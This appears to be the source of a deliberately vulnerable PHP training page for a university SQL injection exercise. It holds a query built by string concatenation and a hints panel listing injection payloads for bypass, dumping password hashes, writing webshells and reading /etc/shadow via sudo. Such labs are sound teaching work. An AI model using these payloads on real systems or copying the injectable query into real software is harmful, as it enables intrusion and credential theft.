<?php
// src/index.php
// Database configuration
$db_host = getenv('DB_HOST') ?: 'db';
$db_user = getenv('DB_USER') ?: 'dvwa';
$db_pass = getenv('DB_PASS') ?: 'p@ssw0rd';
$db_name = getenv('DB_NAME') ?: 'dvwa';

// Connect to database
$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Process form submission
$results = '';
$query_executed = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_id'])) {
    $user_id = $_POST['user_id'];
    
    // VULNERABLE QUERY - Direct string concatenation
    $sql = "SELECT user_id, first_name, last_name, user FROM users WHERE user_id = '$user_id'";
    $query_executed = $sql;
    
    // Execute the vulnerable query
    $result = $conn->query($sql);
    
    if ($result === false) {
        $error = $conn->error;
    } else {
        $results = $result;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Demo - University of Nicosia</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        
        .header {
            background: white;
            padding: 30px;
            border-radius: 10px 10px 0 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .logo {
            flex-shrink: 0;
        }

        .logo img {
            height: 120px;
            width: auto;
            max-width: 300px;
        }

        .header-text {
            flex: 1;
        }
        
        .header-text h1 {
            color: #333;
            margin-bottom: 5px;
            font-size: 28px;
        }

        .header-text .subtitle {
            color: #666;
            font-size: 16px;
            margin-bottom: 10px;
        }
        
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 5px;
            margin-top: 15px;
            color: #856404;
        }
        
        .main-content {
            background: white;
            padding: 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .vulnerability-badge {
            display: inline-block;
            background: #dc3545;
            color: white;
            padding: 8px 16px;
            border-radius: 5px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        
        .query-form {
            margin: 20px 0;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #333;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #3b82f6;
        }
        
        button {
            background: #3b82f6;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        button:hover {
            background: #2563eb;
        }
        
        .results {
            margin-top: 30px;
        }
        
        .sql-query {
            background: #f8f9fa;
            padding: 15px;
            border-left: 4px solid #3b82f6;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            word-wrap: break-word;
        }
        
        .sql-query strong {
            color: #3b82f6;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background: #3b82f6;
            color: white;
            font-weight: bold;
        }
        
        tr:hover {
            background: #f8f9fa;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #f5c6cb;
            margin-bottom: 15px;
        }

        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 15px;
            border: 1px solid #c3e6cb;
        }
        
        .hints {
            background: white;
            padding: 30px;
            border-radius: 0 0 10px 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-top: 2px;
            display: none;
        }

        .hints.visible {
            display: block;
        }

        .hints-toggle {
            background: white;
            padding: 20px;
            text-align: center;
            border-radius: 0 0 10px 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-top: 2px;
        }

        .hints-toggle button {
            background: #10b981;
            font-size: 16px;
            padding: 12px 30px;
        }

        .hints-toggle button:hover {
            background: #059669;
        }
        
        .hints h3 {
            color: #333;
            margin-bottom: 15px;
        }
        
        .hints ul {
            list-style-position: inside;
            color: #666;
        }
        
        .hints li {
            margin-bottom: 10px;
            line-height: 1.6;
        }
        
        .hints code {
            background: #f8f9fa;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            color: #dc3545;
        }

        .footer {
            text-align: center;
            color: white;
            margin-top: 30px;
            padding: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <img src="logo.png" alt="University of Nicosia Logo" onerror="this.src='https://www.unic.ac.cy/wp-content/themes/unic/assets/img/logo.svg'">
            </div>
            <div class="header-text">
                <h1>🔓 SQL Injection Vulnerability Demo</h1>
                <p class="subtitle">Cybersecurity Training Exercise</p>
                <div class="warning">
                    <strong>⚠️ Educational Purpose:</strong> This is a vulnerable application designed for learning. Never write code like this in production!
                    <br><strong>🚨 Security Misconfiguration:</strong> This web server runs as privileged user 'webadmin' with sudo access to demonstrate privilege escalation impact!
                </div>
            </div>
        </div>
        
        <div class="main-content">
            <span class="vulnerability-badge">🚨 VULNERABLE - No Input Sanitization</span>
            
            <form class="query-form" method="POST">
                <div class="form-group">
                    <label for="user_id">User ID:</label>
                    <input type="text" id="user_id" name="user_id" placeholder="Enter user ID (e.g., 1)" required>
                </div>
                <button type="submit">Submit Query</button>
            </form>
            
            <?php if ($query_executed): ?>
            <div class="results">
                <div class="sql-query">
                    <strong>Original Query Template:</strong><br>
                    <code>SELECT * FROM users WHERE user_id = '$user_id'</code>
                    <br><br>
                    <strong>User Input Received:</strong><br>
                    <code style="color: #dc3545;"><?php echo htmlspecialchars($user_id); ?></code>
                    <br><br>
                    <strong>Final Executed Query:</strong><br>
                    <code><?php echo htmlspecialchars($query_executed); ?></code>
                </div>
                
                <?php if ($error): ?>
                    <div class="error">
                        <strong>SQL Error:</strong><br>
                        <?php echo htmlspecialchars($error); ?>
                    </div>
                <?php elseif ($results && $results->num_rows > 0): ?>
                    <div class="success">
                        <strong>✅ Query executed successfully!</strong> Found <?php echo $results->num_rows; ?> result(s).
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <?php 
                                $first_row = $results->fetch_assoc();
                                $results->data_seek(0);
                                foreach (array_keys($first_row) as $column) {
                                    echo "<th>" . htmlspecialchars($column) . "</th>";
                                }
                                ?>
                            </tr>
                        </thead>
                        <tbody>
                            <?php while ($row = $results->fetch_assoc()): ?>
                            <tr>
                                <?php foreach ($row as $value): ?>
                                    <td><?php echo htmlspecialchars($value); ?></td>
                                <?php endforeach; ?>
                            </tr>
                            <?php endwhile; ?>
                        </tbody>
                    </table>
                <?php else: ?>
                    <div class="error">No results found.</div>
                <?php endif; ?>
            </div>
            <?php endif; ?>
        </div>
        
        <div class="hints-toggle" id="hintsToggle">
            <button onclick="toggleHints()">💡 Show Hints & Injection Examples</button>
        </div>

        <div class="hints" id="hints">
            <h3>💡 SQL Injection Payloads to Try:</h3>
            
            <h4 style="margin-top: 20px; margin-bottom: 10px;">Basic Injections:</h4>
            <ul>
                <li><strong>OR injection:</strong> <code>1' OR '1'='1</code> - Bypasses authentication, returns all users</li>
                <li><strong>Comment-based:</strong> <code>1' OR 1=1-- -</code> or <code>1' OR 1=1#</code> - Comments out rest of query</li>
                <li><strong>Always true:</strong> <code>1' AND '1'='1</code> - String concatenation manipulation</li>
            </ul>

            <h4 style="margin-top: 20px; margin-bottom: 10px;">Information Gathering:</h4>
            <ul>
                <li><strong>Database version:</strong> <code>1' UNION SELECT NULL, VERSION(), NULL, NULL-- -</code></li>
                <li><strong>Current database:</strong> <code>1' UNION SELECT NULL, DATABASE(), NULL, NULL-- -</code></li>
                <li><strong>Current user:</strong> <code>1' UNION SELECT NULL, USER(), NULL, NULL-- -</code></li>
                <li><strong>List tables:</strong> <code>1' UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- -</code></li>
            </ul>

            <h4 style="margin-top: 20px; margin-bottom: 10px;">Advanced Techniques:</h4>
            <ul>
                <li><strong>Time-based blind:</strong> <code>1' AND SLEEP(5)-- -</code> - Causes 5 second delay if vulnerable</li>
                <li><strong>Boolean-based blind:</strong> <code>1' AND 1=1-- -</code> vs <code>1' AND 1=2-- -</code> - Compare responses</li>
                <li><strong>Extract secrets table:</strong> <code>1' UNION SELECT NULL, secret_data, NULL, NULL FROM secrets-- -</code></li>
                <li><strong>Column enumeration:</strong> <code>1' ORDER BY 1-- -</code>, <code>1' ORDER BY 2-- -</code>, etc. - Find column count</li>
            </ul>

            <h4 style="margin-top: 20px; margin-bottom: 10px;">Data Exfiltration:</h4>
            <ul>
                <li><strong>Extract all usernames:</strong> <code>1' UNION SELECT NULL, GROUP_CONCAT(user), NULL, NULL FROM users-- -</code></li>
                <li><strong>Extract password hashes:</strong> <code>1' UNION SELECT user_id, user, password, NULL FROM users-- -</code></li>
                <li><strong>All users with passwords:</strong> <code>1' UNION SELECT NULL, CONCAT(user,':',password), NULL, NULL FROM users-- -</code></li>
                <li><strong>Multiple tables:</strong> <code>1' UNION SELECT user_id, first_name, last_name, user FROM users-- -</code></li>
            </ul>

            <h4 style="margin-top: 20px; margin-bottom: 10px;">File Operations (Webshell Upload):</h4>
            <ul>
                <li><strong>Check MySQL version:</strong> <code>1' UNION SELECT NULL, VERSION(), NULL, NULL-- -</code></li>
                <li><strong>Upload simple webshell:</strong> <code>1' UNION SELECT NULL, '&lt;?php system($_GET["cmd"]); ?&gt;', NULL, NULL INTO OUTFILE '/var/www/html/shell.php'-- -</code></li>
                <li><strong>Upload alternative shell:</strong> <code>1' UNION SELECT NULL, '&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;', NULL, NULL INTO OUTFILE '/var/www/html/cmd.php'-- -</code></li>
                <li><strong>Upload full-featured shell:</strong> <code>1' UNION SELECT NULL, '&lt;?php if(isset($_GET["cmd"])){echo "&lt;pre&gt;";$output=shell_exec($_GET["cmd"]);echo $output;echo "&lt;/pre&gt;";}?&gt;', NULL, NULL INTO OUTFILE '/var/www/html/web.php'-- -</code></li>
                <li><strong>Test webshell as privileged user:</strong> 
                    <ul style="margin-top: 10px;">
                        <li><code>http://localhost:8080/shell.php?cmd=whoami</code> (shows: webadmin)</li>
                        <li><code>http://localhost:8080/shell.php?cmd=id</code> (shows: webadmin with sudo group)</li>
                        <li><code>http://localhost:8080/shell.php?cmd=ifconfig</code> (network info)</li>
                        <li><code>http://localhost:8080/shell.php?cmd=sudo cat /etc/shadow</code> (escalate to root!)</li>
                        <li><code>http://localhost:8080/shell.php?cmd=sudo ls -la /root</code> (access root directory)</li>
                    </ul>
                </li>
            </ul>

            <p style="margin-top: 15px; padding: 10px; background: #f8d7da; border-left: 4px solid #dc3545; color: #721c24;">
                <strong>🚨 Critical Security Lesson:</strong> This server runs as 'webadmin' with sudo privileges, demonstrating why proper privilege separation is crucial. In production:
                <br>✅ Never run web servers with sudo access
                <br>✅ Always use least-privilege principles
                <br>✅ SQL Injection + Privileged User + Sudo = Complete system compromise
            </p>

            <p style="margin-top: 20px; color: #666; font-style: italic;">
                🎓 <strong>Learning Objective:</strong> Understand how unsanitized user input can manipulate SQL queries to extract sensitive data, bypass authentication, and compromise database security.
            </p>
        </div>

        <div class="footer">
            <p>University of Nicosia - Cybersecurity Education</p>
            <p>Always practice ethical hacking and responsible disclosure</p>
        </div>
    </div>

    <script>
        function toggleHints() {
            const hints = document.getElementById('hints');
            const toggle = document.getElementById('hintsToggle');
            const button = toggle.querySelector('button');
            
            if (hints.classList.contains('visible')) {
                hints.classList.remove('visible');
                button.textContent = '💡 Show Hints & Injection Examples';
            } else {
                hints.classList.add('visible');
                button.textContent = '🔼 Hide Hints';
            }
        }
    </script>
</body>
</html>
<?php $conn->close(); ?>